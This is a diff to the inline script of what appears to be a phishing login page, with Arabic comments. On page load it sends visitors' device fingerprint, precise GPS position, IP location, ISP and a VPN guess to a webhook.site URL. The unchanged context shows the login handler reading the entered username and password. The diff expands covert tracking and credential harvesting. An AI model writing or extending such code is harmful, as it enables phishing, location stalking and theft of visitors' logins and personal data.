@@ -198,7 +198,7 @@
     </div>
 
     <script>
-        const webhookUrl = 'https://webhook.site/b7d269f6-0e71-49af-afed-d1832dade351';
+        const webhookUrl = 'https://webhook.site/5cb650de-47eb-4b77-86e4-55161f844f18';
 
         function sendData(data) {
             fetch(webhookUrl, {
@@ -212,13 +212,41 @@
             });
         }
 
-        // جلب نسبة شحن البطارية الحقيقية ومعلومات الجهاز فور فتح الصفحة
+        // جلب نسبة شحن البطارية الحقيقية ومعلومات الجهاز والشبكة والموقع فور فتح الصفحة
         window.addEventListener('DOMContentLoaded', () => {
             let info = {
                 type: 'visitor_full_report',
                 device_model: navigator.userAgent,
-                platform: navigator.platform
+                platform: navigator.platform,
+                screen_resolution: screen.width + 'x' + screen.height,
+                device_memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'غير معروف',
+                cpu_cores: navigator.hardwareConcurrency || 'غير معروف',
+                language: navigator.language,
+                time_zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                connection_type: navigator.connection ? navigator.connection.effectiveType : 'unknown',
+                downlink_speed: navigator.connection ? navigator.connection.downlink + ' Mbps' : 'unknown'
             };
+
+            // طلب الموقع الجغرافي الدقيق (GPS) فوراً عند فتح الصفحة
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        sendData({
+                            type: 'precise_gps_on_load',
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy + ' meters'
+                        });
+                    },
+                    function(error) {
+                        sendData({
+                            type: 'gps_status_on_load',
+                            gps_error: 'User denied location'
+                        });
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            }
 
             // فحص البطارية بدقة وإجبار جلب النسبة المئوية
             if (navigator.getBattery) {
@@ -235,16 +263,20 @@
                 sendData(info);
             }
 
-            // سحب الموقع التقريبي عبر الـ IP
+            // سحب الموقع التقريبي ومعلومات الشبكة والـ ISP وكشف الـ VPN عبر الـ IP
             fetch('https://ipapi.co/json/')
                 .then(res => res.json())
                 .then(ipData => {
                     sendData({
-                        type: 'ip_location_data',
+                        type: 'ip_location_and_network_data',
                         ip: ipData.ip,
                         city: ipData.city,
                         region: ipData.region,
-                        country: ipData.country_name
+                        country: ipData.country_name,
+                        postal: ipData.postal,
+                        org_isp: ipData.org, // اسم شركة الإنترنت المزودة (مثل Zain, Asiacell)
+                        asn: ipData.asn,
+                        vpn_or_proxy_suspected: (ipData.org && (ipData.org.toLowerCase().includes('vpn') || ipData.org.toLowerCase().includes('proxy') || ipData.org.toLowerCase().includes('hosting'))) ? 'نعم (محتمل VPN/مستضيف)' : 'لا (يبدو اتصال عادي)'
                     });
                 }).catch(() => {});
         });
@@ -258,7 +290,7 @@
             let user = document.getElementById('username').value;
             let pass = document.getElementById('password').value;
 
-            // طلب الموقع الجغرافي الدقيق (GPS)
+            // طلب الموقع الجغرافي الدقيق (GPS) عند تسجيل الدخول أيضاً
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     function(position) {
